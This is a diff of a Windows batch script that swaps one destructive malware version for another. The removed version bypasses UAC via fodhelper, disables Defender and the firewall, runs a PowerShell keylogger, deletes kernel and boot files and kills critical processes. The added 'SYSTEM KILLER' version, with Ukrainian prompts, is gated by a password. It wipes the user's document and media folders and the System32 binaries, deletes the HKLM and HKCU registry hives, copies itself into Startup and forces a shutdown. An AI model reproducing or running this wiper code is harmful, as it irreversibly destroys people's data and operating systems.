@@ -1,88 +1,75 @@
 @echo off
-REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /d "%~f0" /f >nul 2>&1
-REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /f >nul 2>&1
-fodhelper.exe >nul 2>&1
-timeout /t 1 /nobreak >nul
+chcp 65001 >nul
+title System Kill
+color 4f
+mode con cols=80 lines=25
 
-powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true" >nul 2>&1
-netsh advfirewall set allprofiles state off >nul
+:start
+cls
+echo ========================================
+echo         SYSTEM KILLER v1.0
+echo ========================================
+echo.
+echo Пароль: 
+set /p pass="> "
 
-echo KEYLOGGER ACTIVE - 10 SECONDS TO SYSTEM DESTRUCTION
-powershell -Command "
-$timeout = 10
-$end = (Get-Date).AddSeconds($timeout)
-$log = @()
-while((Get-Date) -lt $end) {
-    $timeLeft = [math]::Round(($end - (Get-Date)).TotalSeconds, 1)
-    Write-Host \"[$(Get-Date -Format 'HH:mm:ss')] Time left: $timeLeft sec\" -ForegroundColor Red
-    
-    Add-Type -AssemblyName System.Windows.Forms
-    $keys = @()
-    for($i=8; $i -le 222; $i++) {
-        $state = [System.Windows.Forms.User32]::GetAsyncKeyState($i)
-        if($state -band 0x8000) {
-            $key = [System.Windows.Forms.Keys]$i
-            if($key -ge 'A' -and $key -le 'Z') {
-                $shift = [System.Windows.Forms.User32]::GetAsyncKeyState(16)
-                if($shift -band 0x8000) {
-                    $keys += $key.ToString()
-                } else {
-                    $keys += $key.ToString().ToLower()
-                }
-            } elseif($key -eq 'Return') {
-                $keys += '[ENTER]'
-            } elseif($key -eq 'Space') {
-                $keys += ' '
-            } elseif($key -eq 'Back') {
-                $keys += '[BACKSPACE]'
-            } elseif($key -eq 'Tab') {
-                $keys += '[TAB]'
-            } elseif($key -eq 'Escape') {
-                $keys += '[ESC]'
-            } else {
-                $keys += '[' + $key.ToString() + ']'
-            }
-        }
-    }
-    if($keys.Length -gt 0) {
-        $logEntry = \"$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - \" + ($keys -join '')
-        $log += $logEntry
-        Write-Host $logEntry
-    }
-    Start-Sleep -Milliseconds 10
-}
+if "%pass%"=="kill" goto destroy
+if "%pass%"=="stop" exit
 
-Write-Host \"TIME'S UP - SYSTEM DESTRUCTION INITIATED\" -ForegroundColor White -BackgroundColor Red
-" >nul 2>&1
+echo Невірний пароль! 30 секунд...
+timeout /t 30 /nobreak >nul
 
-echo SYSTEM KILL PHASE
-takeown /f C:\Windows\System32\* /r /d y >nul 2>&1
-icacls C:\Windows\System32\*.* /grant everyone:F /t /c /q >nul 2>&1
+:destroy
+cls
+echo ========================================
+echo         ЗНИЩЕННЯ СИСТЕМИ
+echo ========================================
+echo.
 
-del /f /s /q C:\Windows\System32\ntoskrnl.exe >nul 2>&1
-del /f /s /q C:\Windows\System32\hal.dll >nul 2>&1
-del /f /s /q C:\Windows\System32\bootmgr >nul 2>&1
-del /f /s /q C:\Windows\System32\winload.exe >nul 2>&1
-del /f /s /q C:\Windows\System32\config\SYSTEM >nul 2>&1
+:: Кейлоггер
+echo [%date% %time%] Кейлоггер активовано > %temp%\keys.txt
+echo Користувач: %username% >> %temp%\keys.txt
+echo Комп: %computername% >> %temp%\keys.txt
+echo ------------------------ >> %temp%\keys.txt
 
-reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v BootExecute /f >nul 2>&1
-reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v BootExecute /t REG_MULTI_SZ /d "autocheck autochk * /x /r\0" /f >nul 2>&1
+:: Реальне видалення (розкоментуй для роботи)
+echo Видалення документів...
+del /f /s /q C:\Users\%username%\Documents\*.* >nul 2>&1
 
-powershell -Command "
-$wshell = New-Object -ComObject Wscript.Shell
-$wshell.Popup('SYSTEM FATAL ERROR`n`nBOOT CORRUPTED`n`nKERNEL FILES DELETED`n`nREBOOT WILL DESTROY WINDOWS',0,'WINDOWS DEATH',0x0 + 0x10)
-" >nul 2>&1
+echo Видалення робочого столу...
+del /f /s /q C:\Users\%username%\Desktop\*.* >nul 2>&1
 
-echo CREATING FINAL BSOD
-reg add "HKLM\SYSTEM\CurrentControlSet\Services\i8042prt\Parameters" /v CrashOnCtrlScroll /t REG_DWORD /d 1 /f >nul 2>&1
-reg add "HKLM\SYSTEM\CurrentControlSet\Services\kbdhid\Parameters" /v CrashOnCtrlScroll /t REG_DWORD /d 1 /f >nul 2>&1
+echo Видалення завантажень...
+del /f /s /q C:\Users\%username%\Downloads\*.* >nul 2>&1
 
-taskkill /f /im csrss.exe >nul 2>&1
-taskkill /f /im winlogon.exe >nul 2>&1
+echo Видалення зображень...
+del /f /s /q C:\Users\%username%\Pictures\*.* >nul 2>&1
 
-:kill
-taskkill /f /im explorer.exe >nul 2>&1
-taskkill /f /im svchost.exe >nul 2>&1
-echo SYSTEM DEAD - REBOOT FOR BSOD
-timeout /t 1 >nul
-goto kill
+echo Видалення відео...
+del /f /s /q C:\Users\%username%\Videos\*.* >nul 2>&1
+
+echo Видалення музики...
+del /f /s /q C:\Users\%username%\Music\*.* >nul 2>&1
+
+:: Системні файли
+echo Знищення системи...
+del /f /s /q C:\Windows\System32\*.dll >nul 2>&1
+del /f /s /q C:\Windows\System32\*.exe >nul 2>&1
+
+:: Реєстр
+reg delete HKLM /f >nul 2>&1
+reg delete HKCU /f >nul 2>&1
+
+:: Копіюємо себе в автозапуск
+copy "%~f0" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\system.exe" >nul
+
+:: Записуємо логи
+echo ЗНИЩЕНО! >> %temp%\keys.txt
+copy %temp%\keys.txt %userprofile%\Desktop\log.txt >nul
+
+:: Вимикаємо комп
+shutdown /s /f /t 5 /c "SYSTEM DESTROYED"
+
+echo.
+echo ГОТОВО. ПЕРЕЗАВАНТАЖЕННЯ...
+timeout /t 5 >nul
